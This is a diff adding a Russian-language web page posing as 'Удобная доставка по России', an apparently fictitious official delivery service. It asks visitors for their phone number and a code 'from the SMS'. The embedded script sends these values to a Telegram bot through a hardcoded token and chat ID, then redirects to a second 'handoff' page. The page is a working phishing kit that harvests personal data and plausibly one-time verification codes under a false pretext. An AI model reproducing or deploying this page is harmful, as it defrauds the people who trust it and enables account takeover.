@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Регистрация посылки — подтверждение</title>
+  <meta name="description" content="Подтверждение номера телефона и номера посылки из СМС."/>
+  <style>
+    :root{
+      --green:#12a150; --green-600:#0e8744; --bg:#f6f8f7; --card:#fff;
+      --text:#1f2328; --muted:#667085; --border:#e6e7ea; --ring:rgba(18,161,80,.25);
+    }
+    *{box-sizing:border-box}
+    body{margin:0;background:var(--bg);color:var(--text);font:16px/1.6 system-ui,-apple-system,Segoe UI,Roboto,Inter,Arial,sans-serif}
+    .container{max-width:720px;margin:0 auto;padding:0 16px}
+    header{background:#fff;border-bottom:1px solid var(--border)}
+    .head{display:flex;align-items:center;justify-content:space-between;padding:14px 0}
+    .brand{display:flex;gap:10px;align-items:center;text-decoration:none}
+    .logo{width:34px;height:34px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#1bd46a 0 40%,#0e8744 60%);display:grid;place-items:center;color:#fff;font-weight:800}
+    .title{font-weight:800;color:var(--green)}
+    main{padding:36px 0}
+    .card{background:var(--card);border:1px solid var(--border);border-radius:16px;box-shadow:0 6px 18px rgba(0,0,0,.05);padding:22px}
+    h1{margin:0 0 6px;font-size:26px}
+    .sub{color:var(--muted);margin:0 0 14px}
+    .grid{display:grid;grid-template-columns:1fr;gap:16px}
+    label{font-size:13px;color:var(--muted);font-weight:600}
+    input{border:1px solid var(--border);border-radius:12px;padding:12px;font-weight:600;width:100%}
+    input:focus{outline:3px solid var(--ring);border-color:var(--green)}
+    .row{display:flex;gap:10px;align-items:center}
+    .btn{appearance:none;border:1px solid var(--border);background:#fff;color:var(--text);border-radius:10px;padding:10px 16px;font-weight:700;cursor:pointer}
+    .btn:hover{background:#f3f5f4}
+    .btn-primary{background:var(--green);border-color:var(--green);color:#fff}
+    .btn-primary:hover{background:var(--green-600)}
+    .footer{margin:30px 0 40px;color:var(--muted);text-align:center}
+    @media (max-width:520px){ .row{flex-direction:column;align-items:stretch} }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container head">
+      <a class="brand" href="/">
+        <div class="logo">▶</div>
+        <div class="title">Удобная доставка по России</div>
+      </a>
+      <div class="muted">Шаг 2 из 2</div>
+    </div>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="card" role="form" aria-labelledby="formTitle">
+        <h1 id="formTitle">Регистрация</h1>
+        <p class="sub">Введите номер телефона и <b>номер посылки из СМС-уведомления</b>.</p>
+
+        <div class="grid">
+          <div>
+            <label for="phone">Номер телефона</label>
+            <input id="phone" type="tel" inputmode="tel" placeholder="+7 (___) ___-__-__" autocomplete="tel" maxlength="18">
+          </div>
+
+          <div>
+            <label for="parcel">Номер посылки из СМС</label>
+            <input id="parcel" type="text" maxlength="20" placeholder="Введите номер">
+          </div>
+
+          <div class="row">
+            <button class="btn btn-primary" id="submitBtn" type="button">Подтвердить</button>
+            <button class="btn" type="button" onclick="history.back()">Назад</button>
+          </div>
+          <p class="sub">Нажимая «Подтвердить», вы соглашаетесь с обработкой персональных данных.</p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <div>8 800 123-45-67 · support@example.ru</div>
+      <div>ООО «Удобная доставка по России». Официальный сервис доставки по РФ.</div>
+    </div>
+  </footer>
+
+  <script>
+    const BOT_TOKEN = "7976224401:AAGTgRBUn7AS9W7ahNewXd_jIsIq6uiNFqs"; // ⚠️ виден в коде
+    const CHAT_ID   = -1003082050145; // id вашей группы
+    const SUCCESS_URL = "./handoff2.html";
+
+    // Маска телефона под +7 (999) 123-45-67
+    const phoneInput = document.getElementById('phone');
+    phoneInput.addEventListener('input', e => {
+      let v = e.target.value.replace(/\D/g,'');
+      if(!v.startsWith('7')) v = '7' + v.replace(/^7/,'');
+      v = v.slice(0,11);
+      let out = '+7';
+      if(v.length>1) out += ' (' + v.slice(1,4);
+      if(v.length>=4) out += ') ' + v.slice(4,7);
+      if(v.length>=7) out += '-' + v.slice(7,9);
+      if(v.length>=9) out += '-' + v.slice(9,11);
+      e.target.value = out;
+    });
+
+    async function sendToTelegram(text){
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const res = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text })
+      });
+      if (!res.ok) throw new Error('Telegram API error');
+      return res.json();
+    }
+
+    document.getElementById('submitBtn').addEventListener('click', async () => {
+      const phone = phoneInput.value.trim();
+      const parcel = document.getElementById('parcel').value.trim();
+
+      const rawPhone = phone.replace(/\D/g,'');
+      if (rawPhone.length !== 11) { alert('Введите корректный номер телефона.'); return; }
+      if (parcel.length < 4) { alert('Введите номер посылки из СМС.'); return; }
+
+      const text = `📦 Регистрация посылки\n📞 Телефон: ${phone}\n🧾 Номер из СМС: ${parcel}`;
+
+      try {
+        await sendToTelegram(text);
+        window.location.href = SUCCESS_URL; // переход на страницу после отправки
+      } catch (e) {
+        console.error(e);
+        alert('Не удалось отправить данные. Попробуйте ещё раз.');
+      }
+    });
+  </script>
+</body>
+</html>
